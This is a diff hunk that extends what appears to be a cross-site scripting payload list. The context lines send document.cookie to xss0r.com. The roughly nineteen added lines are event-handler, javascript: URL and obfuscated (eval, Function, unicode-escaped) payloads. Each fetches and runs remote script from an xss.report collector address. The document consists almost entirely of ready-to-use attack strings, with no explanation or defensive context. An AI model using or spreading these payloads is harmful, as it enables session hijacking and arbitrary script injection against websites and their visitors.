@@ -104,3 +104,22 @@ javascript://%27%22%3E%3Csvg%20onmouseover%3D%22fetch('https://xss0r.com/c/hunte
 javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)//>
 javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
 '//><scrIpt src=//xss.report/c/hnterx></scrIpt>
+<a href="javascript:fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="#" onclick="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Click me</a>
+<input onblur="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">
+<div ondblclick="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Double-click me</div>
+<div oncontextmenu="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Right-click me</div>
+<div onmouseover="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Hover over me</div>
+<div onmousedown="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Press me</div>
+<div onmouseup="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Release me</div>
+<div onwheel="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Scroll on me</div>
+<a onclick="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Click</a>
+<a href="javascript:(new Function('fetch(\'https://xss.report/c/hnterx\').then(r=>r.text()).then(t=>{let s=document.createElement(\'script\');s.innerHTML=t;document.body.appendChild(s);})'))()">Click me</a>
+<a href="javascript:let f='fetch',u='https://xss.report/c/hnterx',e='eval';window[e](`${f}('${u}').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})`)">Click me</a>
+<a href="javascript:fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="javascript:eval('\u0066\u0065\u0074\u0063\u0068(\u0027https://xss.report/c/hnterx\u0027).then(\u0072=>\u0072.text()).then(\u0074=>{let \u0073=document.createElement(\u0027script\u0027);\u0073.innerHTML=\u0074;document.body.appendChild(\u0073);})')">Click me</a>
+<div onmouseover="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Hover over me</div>
+<a href="javascript:(function(){let s=document.createElement('script');s.src='https://xss.report/c/hnterx';document.body.appendChild(s);})()">Click me</a>
+<div onclick="let s=document.createElement('script');s.src='https://xss.report/c/hnterx';document.body.appendChild(s);">Click me</div>
+<textarea onfocus="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Focus me</textarea>
+<div onclick="let u='https://xss.report/c/'.concat('hnterx');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
